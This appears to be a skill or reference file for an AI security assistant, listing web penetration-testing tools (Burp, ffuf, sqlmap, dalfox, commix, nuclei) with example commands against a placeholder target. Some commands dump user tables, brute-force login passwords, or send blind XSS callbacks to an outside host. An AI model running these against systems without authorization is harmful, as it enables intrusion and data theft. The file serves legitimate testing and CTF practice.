# TOOLS Skill: Web Application Tools

## Purpose
Master web application testing tools.

## Proxy Tools

### Burp Suite
```bash
# Start Burp
burpsuite &

# Proxy settings
# Browser: localhost:8080
# Options: Intercept on/off

# Tools
# Proxy - Intercept
# Spider - Crawl
# Scanner - Automated scan
# Intruder - Fuzzing
# Repeater - Manual testing
# Decoder - Encode/decode
# Comparer - Compare responses
```

### OWASP ZAP
```bash
# GUI
zap

# CLI
zap-cli quick-scan https://target.com
zap-cli spider https://target.com
zap-cli active-scan https://target.com
```

## Fuzzing

### ffuf
```bash
# Basic fuzzing
ffuf -w wordlist.txt -u https://target.com/FUZZ

# POST fuzzing
ffuf -w wordlist.txt -u https://target.com/login -X POST -d "user=admin&pass=FUZZ"

# Headers
ffuf -w wordlist.txt -u https://target.com/ -H "X-Forwarded-By: FUZZ"

# Virtual host
ffuf -w wordlist.txt -u https://target.com -H "Host: FUZZ.target.com"

# Rate limiting
ffuf -w wordlist.txt -u https://target.com/FUZZ -t 10 -p 0.1

# Colors
ffuf -w wordlist.txt -u https://target.com/FUZZ -c
```

### wfuzz
```bash
wfuzz -w wordlist.txt https://target.com/FUZZ
wfuzz -w wordlist.txt -d "user=admin&pass=FUZZ" https://target.com/login
```

### gobuster
```bash
# Directory busting
gobuster dir -u https://target.com -w wordlist.txt

# DNS
gobuster dns -d target.com -w wordlist.txt

# Virtual hosts
gobuster vhost -u https://target.com -w wordlist.txt
```

## SQL Injection

### sqlmap
```bash
# Basic scan
sqlmap -u "https://target.com/page?id=1"

# POST request
sqlmap -u "https://target.com/login" --data="user=admin&pass=test"

# With cookie
sqlmap -u "https://target.com/page?id=1" --cookie="PHPSESSID=abc"

# List databases
sqlmap -u "https://target.com/page?id=1" --dbs

# Dump table
sqlmap -u "https://target.com/page?id=1" -D dbname -T users --dump

# Full automation
sqlmap -u "https://target.com/page?id=1" --batch --risk=3 --level=5
```

## XSS

### dalfox
```bash
# Basic scan
dalfox url https://target.com/search?q=test

# With cookies
dalfox url https://target.com/page?id=1 --cookie="PHPSESSID=abc"

# Blind XSS
dalfox url https://target.com/contact -b https://your.xss.ht
```

### xsstrike
```bash
python3 xsstrike.py -u "https://target.com/search?q=test"
```

## Command Injection

### commix
```bash
# Basic
commix -u "https://target.com/ping?ip=127.0.0.1"

# POST data
commix -u "https://target.com/ping" --data="ip=127.0.0.1"
```

## SSRF

### ssrfmap
```bash
python3 ssrfmap.py -r request.txt -p param
```

## OAuth Testing

### oauth2yolo
```bash
python3 oauth2yolo.py -c config.json
```

## API Testing

### httpie
```bash
# Basic
http GET https://api.target.com/users

# With auth
http GET https://api.target.com/protected Authorization:"Bearer token"

# POST
http POST https://api.target.com/users name="John" email="john@example.com"
```

### postman
```bash
# GUI application
# Import collections
# Environment variables
# Runner for automation
```

## Vulnerability Scanning

### nikto
```bash
nikto -h https://target.com
nikto -h https://target.com -p 80,443
nikto -h https://target.com -o results.txt
```

### nuclei
```bash
# Template scanning
nuclei -u https://target.com

# Specific templates
nuclei -u https://target.com -t cves/

# Custom wordlist
nuclei -u https://target.com -w wordlist.txt
```

## Content Discovery

### gau
```bash
# Get all URLs
echo target.com | gau

# With threads
gau -t 10 target.com
```

### waybackurls
```bash
echo target.com | waybackurls
```

## Javascript Analysis

### linkfinder
```bash
python3 linkfinder.py -i https://target.com/js/app.js -o results.html
```

### retire.js
```bash
# Scan JS files
retire target.com/js/app.js
retire --path target.com --jsout results.json
```

## Common Workflows

### Directory Discovery
```bash
# 1. ffuf for directories
ffuf -w /usr/share/wordlists/dirb/common.txt -u https://target.com/FUZZ

# 2. Check for backup files
ffuf -w /usr/share/wordlists/raft-small-directories.txt -u https://target.com/FUZZ.txt

# 3. Parameter discovery
ffuf -w params.txt -u https://target.com/page?FUZZ=value
```

### Full Web Assessment
```bash
# 1. Nikto scan
nikto -h https://target.com -o nikto.txt

# 2. Nuclei scan
nuclei -u https://target.com -o nuclei.txt

# 3. ZAP scan
zap-cli quick-scan https://target.com

# 4. Manual testing with Burp
```

## RedForge Integration
```
Use these tools within RedForge modes:
- bugbounty: Active reconnaissance
- ctf: Web challenges
- learning: Practice web security
```
